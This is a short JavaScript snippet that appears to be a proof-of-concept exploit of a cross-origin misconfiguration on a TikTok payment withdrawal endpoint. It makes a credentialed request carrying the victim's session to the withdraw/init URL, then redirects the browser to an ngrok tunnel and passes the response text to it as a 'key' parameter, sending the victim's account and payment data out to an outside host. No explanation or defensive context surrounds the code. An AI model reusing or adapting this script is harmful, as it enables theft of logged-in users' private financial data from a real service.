var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://fp.us.tiktokv.com/pipo_fe/withdraw/init?country_code=ID&fp_scene_tn=AUEAAAlxJ0wqoEyjk7WWjcLxiUgK&fp_token=AUAAADUtXPstSURluwU9POvKopIUK&target_page=bindPI");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(null);

function reqListener() {
    window.location='//2d7a-140-213-103-229.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
};
